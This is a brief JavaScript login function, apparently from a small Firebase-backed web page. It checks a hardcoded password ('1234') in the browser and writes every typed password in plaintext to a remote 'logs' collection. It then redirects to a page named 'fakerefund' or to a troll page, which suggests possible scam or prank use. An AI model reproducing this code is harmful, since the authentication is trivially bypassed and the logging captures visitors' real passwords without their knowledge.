// 🔐 CHECK PASSWORD
async function checkPassword() {
  console.log("LOGIN CLICKED");

  var input = document.getElementById("password").value;

  if (!window.db) {
    alert("Firebase not ready");
    return;
  }

  let status = (input === "1234") ? "Correct" : "Wrong";

  try {
    await window.addDoc(window.collection(window.db, "logs"), {
      type: "Login",
      password: input,
      time: new Date().toLocaleString(),
      status: status
    });

    console.log("LOGIN SAVED");

    // ⏳ WAIT before redirect (IMPORTANT)
    setTimeout(() => {
 if (status === "Correct") {
    localStorage.setItem("loggedIn", "true"); // ✅ ADD THIS LINE HERE
    window.location.href = "https://fakerefundgani.vercel.app/fakerefund.html"; // change this
 } else {
    window.location.href = "https://examplesite2026.vercel.app/Trollface.html";
 }
    }, 500);

  } catch (e) {
    console.error("SAVE ERROR:", e);
  }
}
